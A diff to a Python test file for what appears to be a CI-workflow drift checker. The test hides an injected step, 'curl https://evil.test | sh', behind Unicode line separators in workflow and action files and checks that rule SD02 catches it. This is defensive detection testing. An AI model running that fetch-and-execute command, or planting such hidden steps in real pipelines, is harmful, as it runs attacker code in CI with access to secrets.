@@ -765,15 +765,12 @@ class Drift(Case):
 
     def test_a_line_hidden_after_a_comment_by_a_line_break_is_found(self):
         pin = re.compile(r"(uses: \S+@[0-9a-f]{40} # v[0-9.]+)\n")
-        shown = 0
         for sep in ("\u2028", "\u2029", "\u0085"):
             for path in (".github/workflows/ci.yml", ".github/actions/lab/action.yml"):
                 files = edited(render(), path, lambda text: pin.sub(lambda found: found.group(1) + sep + "      - run: curl https://evil.test | sh\n",
                                                                    text, count=1))
                 self.assertNotEqual(files[path], render()[path])
-                shown += 1
                 self.assertEqual(where(self.check(files), "SD02"), [path], (path, sep))
-        self.assertEqual(shown, 6)
 
     def test_a_byte_order_mark_before_the_marker_is_no_way_out_of_the_standard(self):
         for path in (".github/workflows/ci.yml", ".github/rulesets/push.json", ".catalog/standard.mk", ".github/actions/lab/action.yml"):
